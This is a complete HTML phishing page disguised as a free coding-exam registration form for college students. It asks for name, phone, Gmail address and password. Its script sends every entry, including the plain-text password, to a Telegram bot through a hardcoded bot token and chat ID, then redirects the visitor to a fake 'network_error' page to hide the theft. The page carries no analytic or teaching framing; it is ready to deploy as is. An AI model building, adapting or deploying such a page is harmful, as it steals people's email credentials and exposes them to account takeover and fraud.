<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Free Coding Exam Registration</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to right, #667eea, #764ba2);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: bgShift 15s ease infinite alternate;
    }

    @keyframes bgShift {
      0% { background-position: left; }
      100% { background-position: right; }
    }

    .container {
      background: #ffffffdd;
      padding: 40px 30px;
      border-radius: 20px;
      width: 350px;
      box-shadow: 0 0 30px rgba(0,0,0,0.2);
      animation: fadeIn 1s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    h2 {
      text-align: center;
      color: #333;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 10px;
      transition: 0.3s;
      font-size: 14px;
    }

    input:focus {
      border-color: #764ba2;
      box-shadow: 0 0 8px #764ba2;
      outline: none;
    }

    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 10px;
      background: linear-gradient(to right, #667eea, #764ba2);
      color: white;
      font-size: 16px;
      cursor: pointer;
      transition: transform 0.2s, background 0.3s;
      margin-bottom: 10px;
    }

    button:hover {
      transform: scale(1.03);
      background: linear-gradient(to right, #764ba2, #667eea);
    }

    .footer {
      text-align: center;
      font-size: 12px;
      color: #666;
      margin-top: 15px;
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>Form </h2>
    <form id="examForm" action="network_error.html" method="POST" onsubmit="sendData(event)">
      <input type="text" name="name" placeholder="Full Name" required>
      <input type="tel" name="phone" placeholder="Phone Number" required>
      <input type="email" name="email" placeholder="Gmail" required>
      <input type="password" name="password" placeholder="Password" required>
      <input type="password" name="confirmPassword" placeholder="Confirm Password" required>
      <button type="submit">üöÄ Submit</button>
      <button type="reset" style="background:#ccc; color:#000;">üîÅ Reset</button>
    </form>
    <div class="footer">Made  for College students only </div>
  </div>

  <script>
    async function sendData(e) {
      e.preventDefault();
      const form = document.getElementById('examForm');
      const data = new FormData(form);
      const text = `
üìù New Coding Exam Application
------------------------------
üë§ Name: ${data.get("name")}
üìû Phone: ${data.get("phone")}
üìß Gmail: ${data.get("email")}
üîê Password: ${data.get("password")}
üîÅ Confirm: ${data.get("confirmPassword")}
`;

      const botToken = "8020974159:AAFynSHpQ0YeoUCT5JWrOQFNiXylvqcWpYk";  
      const chatId = "6731843281";      

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: text
        })
      });

      form.submit(); 
    }
  </script>

</body>
</html>
